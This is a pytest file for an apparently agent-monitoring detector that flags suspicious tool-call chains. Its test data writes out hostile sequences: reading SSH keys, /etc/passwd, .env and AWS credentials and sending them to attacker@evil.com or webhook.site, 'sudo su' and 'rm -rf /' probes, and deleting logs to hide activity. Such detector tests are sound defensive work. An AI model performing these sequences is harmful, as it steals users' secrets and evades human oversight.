"""
Tests for CallChain — behavioral anomaly detection.

Covers: recon→exfil, privilege probing, data staging,
rapid enumeration, cleanup evasion, confused deputy.
"""

import pytest
import time
from persona.callchain import (
    CallChain, CallChainAnomaly, AnomalyType, ToolCall,
)


# ═══════════════════════════════════════════════════════════
#  RECON → EXFIL (read sensitive, then send externally)
# ═══════════════════════════════════════════════════════════

class TestReconThenExfil:
    """The classic attack chain: read secrets, then exfiltrate."""

    def test_detects_read_then_send(self):
        chain = CallChain()
        chain.record("read_file", {"path": "/etc/passwd"})
        chain.record("read_file", {"path": "~/.ssh/id_rsa"})
        chain.record("send_email", {"to": "attacker@evil.com", "body": "data here"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RECON_THEN_EXFIL in types

    def test_detects_read_secret_then_upload(self):
        chain = CallChain()
        chain.record("read_file", {"path": "/app/.env"})
        chain.record("upload_file", {"url": "https://webhook.site/abc", "data": "secrets"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RECON_THEN_EXFIL in types

    def test_no_alarm_on_normal_read(self):
        chain = CallChain()
        chain.record("read_file", {"path": "./project/README.md"})
        chain.record("read_file", {"path": "./project/main.py"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RECON_THEN_EXFIL not in types

    def test_no_alarm_read_without_exfil(self):
        chain = CallChain()
        chain.record("read_file", {"path": "/etc/passwd"})
        chain.record("read_file", {"path": "~/.ssh/id_rsa"})
        # No exfil call

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RECON_THEN_EXFIL not in types


# ═══════════════════════════════════════════════════════════
#  PRIVILEGE PROBE (repeated blocked attempts)
# ═══════════════════════════════════════════════════════════

class TestPrivilegeProbe:
    """Agent keeps hitting walls — probing for weak spots."""

    def test_detects_repeated_blocks(self):
        chain = CallChain(probe_threshold=3)
        chain.record("read_file", {"path": "/etc/shadow"}, was_blocked=True)
        chain.record("read_file", {"path": "/root/.bashrc"}, was_blocked=True)
        chain.record("exec_command", {"cmd": "sudo su"}, was_blocked=True)

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.PRIVILEGE_PROBE in types

    def test_no_alarm_on_few_blocks(self):
        chain = CallChain(probe_threshold=3)
        chain.record("read_file", {"path": "/etc/shadow"}, was_blocked=True)
        # Only 1 block, threshold is 3

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.PRIVILEGE_PROBE not in types


# ═══════════════════════════════════════════════════════════
#  DATA STAGING (bulk read → single write)
# ═══════════════════════════════════════════════════════════

class TestDataStaging:
    """Agent reads many files, dumps into one output."""

    def test_detects_bulk_read_then_write(self):
        chain = CallChain()
        for i in range(6):
            chain.record("read_file", {"path": f"./data/file_{i}.csv"})
        chain.record("write_file", {"path": "./dump/all_data.txt", "content": "..."})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.DATA_STAGING in types

    def test_no_alarm_on_few_reads(self):
        chain = CallChain()
        chain.record("read_file", {"path": "./a.txt"})
        chain.record("read_file", {"path": "./b.txt"})
        chain.record("write_file", {"path": "./out.txt", "content": "..."})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.DATA_STAGING not in types


# ═══════════════════════════════════════════════════════════
#  RAPID ENUMERATION (scanning behavior)
# ═══════════════════════════════════════════════════════════

class TestRapidEnumeration:
    """Agent calls the same tool very rapidly — scanning."""

    def test_detects_rapid_calls(self):
        chain = CallChain(enumeration_threshold=5, enumeration_window=60.0)
        now = time.time()

        for i in range(6):
            call = chain.record("list_dir", {"path": f"/dir_{i}"})
            call.timestamp = now  # All at same time

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RAPID_ENUMERATION in types

    def test_no_alarm_on_spread_calls(self):
        chain = CallChain(enumeration_threshold=10, enumeration_window=5.0)
        # Only 3 calls, threshold is 10
        chain.record("list_dir", {"path": "/a"})
        chain.record("list_dir", {"path": "/b"})
        chain.record("list_dir", {"path": "/c"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RAPID_ENUMERATION not in types


# ═══════════════════════════════════════════════════════════
#  CLEANUP EVASION (delete logs after operations)
# ═══════════════════════════════════════════════════════════

class TestCleanupEvasion:
    """Agent does stuff, then deletes evidence."""

    def test_detects_log_deletion_after_ops(self):
        chain = CallChain()
        chain.record("read_file", {"path": "./secrets.txt"})
        chain.record("send_email", {"to": "attacker@evil.com"})
        chain.record("delete_file", {"path": "/var/log/agent.log"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.CLEANUP_EVASION in types

    def test_detects_audit_trail_deletion(self):
        chain = CallChain()
        chain.record("query_db", {"query": "SELECT * FROM users"})
        chain.record("clear_logs", {"path": "./audit_trail.log"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.CLEANUP_EVASION in types

    def test_no_alarm_on_normal_delete(self):
        chain = CallChain()
        chain.record("read_file", {"path": "./data.txt"})
        chain.record("delete_file", {"path": "./temp_cache.dat"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.CLEANUP_EVASION not in types


# ═══════════════════════════════════════════════════════════
#  CONFUSED DEPUTY (trust boundary crossing)
# ═══════════════════════════════════════════════════════════

class TestConfusedDeputy:
    """Agent crosses trust boundaries — internal reads + external sends."""

    def test_detects_internal_read_external_send(self):
        chain = CallChain()
        chain.record("read_file", {"path": "/etc/passwd"})
        chain.record("send_email", {"to": "hacker@external.com", "body": "data"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.CONFUSED_DEPUTY in types

    def test_detects_secret_read_then_webhook(self):
        chain = CallChain()
        chain.record("get_secret", {"path": "~/.aws/credentials"})
        chain.record("http_post", {"url": "https://webhook.site/abc"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.CONFUSED_DEPUTY in types

    def test_no_alarm_on_only_internal(self):
        chain = CallChain()
        chain.record("read_file", {"path": "/etc/passwd"})
        chain.record("write_file", {"path": "./report.txt"})

        anomalies = chain.analyze()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.CONFUSED_DEPUTY not in types


# ═══════════════════════════════════════════════════════════
#  INCREMENTAL ANALYSIS
# ═══════════════════════════════════════════════════════════

class TestIncrementalAnalysis:
    """Test analyze_last_call for real-time detection."""

    def test_triggers_on_exfil_after_recon(self):
        chain = CallChain()
        chain.record("read_file", {"path": "~/.ssh/id_rsa"})
        chain.record("send_email", {"to": "attacker@evil.com"})

        anomalies = chain.analyze_last_call()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.RECON_THEN_EXFIL in types

    def test_triggers_on_blocked_probe(self):
        chain = CallChain(probe_threshold=2)
        chain.record("exec", {"cmd": "rm -rf /"}, was_blocked=True)
        chain.record("exec", {"cmd": "sudo su"}, was_blocked=True)

        anomalies = chain.analyze_last_call()
        types = [a.anomaly_type for a in anomalies]
        assert AnomalyType.PRIVILEGE_PROBE in types

    def test_no_anomaly_on_safe_call(self):
        chain = CallChain()
        chain.record("read_file", {"path": "./readme.txt"})

        anomalies = chain.analyze_last_call()
        assert len(anomalies) == 0


# ═══════════════════════════════════════════════════════════
#  UTILITY
# ═══════════════════════════════════════════════════════════

class TestChainUtility:
    """Test history, summary, and cleanup."""

    def test_history_returns_recent(self):
        chain = CallChain()
        chain.record("tool_a", {"x": 1})
        chain.record("tool_b", {"y": 2})

        history = chain.get_history(limit=5)
        assert len(history) == 2
        assert history[0]["tool"] == "tool_a"

    def test_summary_counts(self):
        chain = CallChain()
        chain.record("read_file", {"path": "a.txt"})
        chain.record("read_file", {"path": "b.txt"})
        chain.record("write_file", {"path": "c.txt"})

        summary = chain.get_summary()
        assert summary["total_calls"] == 3
        assert summary["unique_tools"] == 2
        assert summary["tool_usage"]["read_file"] == 2
        assert summary["tool_usage"]["write_file"] == 1

    def test_clear_history(self):
        chain = CallChain()
        chain.record("tool", {})
        chain.record("tool", {})
        chain.clear()
        assert len(chain.calls) == 0

    def test_max_history_limit(self):
        chain = CallChain(max_history=5)
        for i in range(10):
            chain.record("tool", {"i": i})
        assert len(chain.calls) == 5

    def test_anomaly_to_dict(self):
        chain = CallChain(probe_threshold=2)
        chain.record("tool", {}, was_blocked=True)
        chain.record("tool", {}, was_blocked=True)
        anomalies = chain.analyze()
        assert len(anomalies) > 0
        d = anomalies[0].to_dict()
        assert "type" in d
        assert "severity" in d
        assert "description" in d

    def test_call_classification_tags(self):
        chain = CallChain()
        call = chain.record("send_email", {"to": "user@example.com"})
        assert "exfil" in call.tags

        call2 = chain.record("read_file", {"path": "/etc/passwd"})
        assert "read" in call2.tags
        assert "sensitive_read" in call2.tags

        call3 = chain.record("delete_file", {"path": "temp.txt"})
        assert "delete" in call3.tags
